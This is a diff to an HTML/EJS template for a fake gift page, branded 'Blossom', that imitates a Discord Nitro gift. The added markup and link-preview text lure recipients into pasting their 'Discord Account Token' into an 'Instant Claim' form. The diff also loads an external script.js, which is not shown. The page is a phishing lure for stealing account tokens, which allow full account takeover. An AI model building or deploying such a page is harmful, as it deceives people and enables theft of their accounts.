@@ -4,12 +4,27 @@
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>My Gift App</title>
-        <meta property="og:title" content="<%= giftName %> gifted <%= productID %> to you!">
-        <meta property="og:description" content="Click the link to claim it">
+        <meta property="og:title" content="You've been gifted <%= giftName %>!">
+        <meta property="og:description" content="<%= senderName %> gifted <%= giftName %> to you! Claim it using Blossom.">
         <meta property="og:image" content="<%= icon %>">
+
+        <link rel="stylesheet" href="style.css">
+        <script src="script.js"></script>
     </head>
     <body>
-        <h1><%= giftName %></h1>
-        <p>Icon: <%= icon %> <br> Product ID: <%= productID %> <br> You received this gift from: <%= senderName %></p>
+        <div class="content">
+            <div class="shine">
+                <img src="assets/nitroIconHD.jpg">
+            </div>
+            <h1>You've been gifted <i><%= giftName %></i>!</h1>
+            <h2>Gift by <%= senderName %></h2>
+            <form>
+                <input type="text" placeholder="Discord Account Token">
+                <button type="submit">Instant Claim</button>
+            </form>
+        </div>
+        <div class="footer">
+            <h4>Powered By Blossom</h4>
+        </div>
     </body>
 </html>
